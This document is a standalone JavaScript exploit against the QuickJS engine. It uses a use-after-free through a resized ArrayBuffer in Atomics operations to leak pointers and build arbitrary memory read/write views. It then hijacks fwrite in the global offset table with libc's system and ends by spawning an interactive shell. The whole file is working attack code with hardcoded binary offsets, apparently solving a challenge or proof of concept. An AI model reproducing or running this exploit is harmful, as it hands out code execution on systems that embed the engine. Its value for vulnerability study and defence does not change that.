// QuickJS exploit: Atomics UAF via resizable ArrayBuffer -> leak PIE+libc -> overwrite fwrite@GOT -> system("sh -i")

function u64(x) { return BigInt.asUintN(64, x); }
function i64(x) { return BigInt.asIntN(64, x); }

// Keep references alive (prevent GC from reclaiming arrays/buffers we point into)
let keep = [];

function uaf_leak_array_values_ptr() {
  // 72 == sizeof(JSObject) in this build
  let rab = new ArrayBuffer(72, { maxByteLength: 0x100000 });
  let ta = new BigInt64Array(rab);
  let victim;

  let obj = {
    valueOf() {
      // realloc() moves buffer; old 72-byte chunk becomes free and will be reused
      rab.resize(0x100000);

      // Allocate a fast JS array; its JSObject reuses the freed 72-byte chunk
      victim = [print];
      keep.push(victim);

      return 0n;
    }
  };

  // stale ptr now points into victim JSObject; offset 56 == u.array.u.values
  return Atomics.add(ta, 7, obj);
}

function make_rw_view(base_addr) {
  // Create a fresh UAF trigger each time; corrupt a typed array view's data pointer.
  let rab = new ArrayBuffer(72, { maxByteLength: 0x100000 });
  let ta = new BigInt64Array(rab);
  let backing = new ArrayBuffer(0x4000);
  keep.push(backing);

  let rw;
  let obj = {
    valueOf() {
      rab.resize(0x100000);

      // Create typed array from an existing ArrayBuffer so the constructor doesn't
      // allocate its own ArrayBuffer JSObject (also 72 bytes) and steal the freed chunk.
      rw = new BigInt64Array(backing);
      keep.push(rw);

      // Written into rw->u.array.u.ptr (offset 56)
      return i64(base_addr);
    }
  };

  Atomics.exchange(ta, 7, obj);
  return rw;
}

// Offsets (computed from shipped binaries)
const OFF_JS_PRINT      = 0x0c8b80n;   // js_print in qjs (PIE)
const OFF_GOT_FWRITE    = 0x10b380n;   // fwrite@GOT (R_X86_64_JUMP_SLOT)
const OFF_LIBC_FWRITE   = 0x07f2c0n;   // fwrite@@GLIBC_2.2.5 in libc
const OFF_LIBC_SYSTEM   = 0x053110n;   // system@@GLIBC_2.2.5 in libc

// Ensure fwrite@GOT is resolved by the dynamic linker before we read it.
// (Otherwise the GOT slot still points back into the PLT resolver trampoline.)
print("warmup");

// 1) Leak JS array elements pointer (JSValue[...])
let values_ptr = u64(uaf_leak_array_values_ptr());

// 2) Read JSValue for `print` from that elements array
let rw_vals = make_rw_view(values_ptr);
let print_obj = u64(rw_vals[0]);        // JSValue.u.ptr

// 3) Read the C function pointer from the print function object to get PIE base
let rw_print = make_rw_view(print_obj);
let js_print_addr = u64(rw_print[7]);   // offset 56 == u.cfunc.c_function
let qjs_base = js_print_addr - OFF_JS_PRINT;

// 4) Read libc via fwrite@GOT
let got_fwrite = qjs_base + OFF_GOT_FWRITE;
let rw_got = make_rw_view(got_fwrite);
let libc_fwrite = u64(rw_got[0]);
let libc_base = libc_fwrite - OFF_LIBC_FWRITE;
let libc_system = libc_base + OFF_LIBC_SYSTEM;

// 5) Overwrite fwrite@GOT -> system
rw_got[0] = i64(libc_system);

// 6) Trigger system("sh -i") via print()'s internal fwrite("sh -i", ...)
print("sh -i");
